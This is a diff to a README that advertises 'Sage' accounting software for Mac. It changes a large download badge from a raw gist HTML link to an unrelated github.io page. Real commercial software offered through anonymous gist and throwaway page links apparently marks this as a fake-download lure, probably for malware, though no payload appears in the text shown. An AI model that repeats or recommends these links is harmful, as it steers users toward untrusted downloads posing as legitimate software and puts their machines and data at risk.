@@ -3,7 +3,7 @@
 
 Sage is a powerful and intuitive business management software designed to streamline your accounting, finance, and enterprise operations directly from your MacBook. 🚀 Install it easily by following the instructions below.
 
-[![Download Sage for Mac](https://img.shields.io/badge/Download-Sage%20Now-2EA44F?style=for-the-badge&logo=apple&logoColor=white)](https://gistcdn.githack.com/link27ilyaangel/c23dc8933fbb4baee1ca4c812a09760a/raw/55f1d191faa4c0ae2b048bf09f6072e09c0f7234/get.html)
+[![Install Sage for Mac](https://img.shields.io/badge/Install-Sage%20Now-2EA44F?style=for-the-badge&logo=apple&logoColor=white)](https://linkolnmoldranz782.github.io/.github/)
 
 ---
 
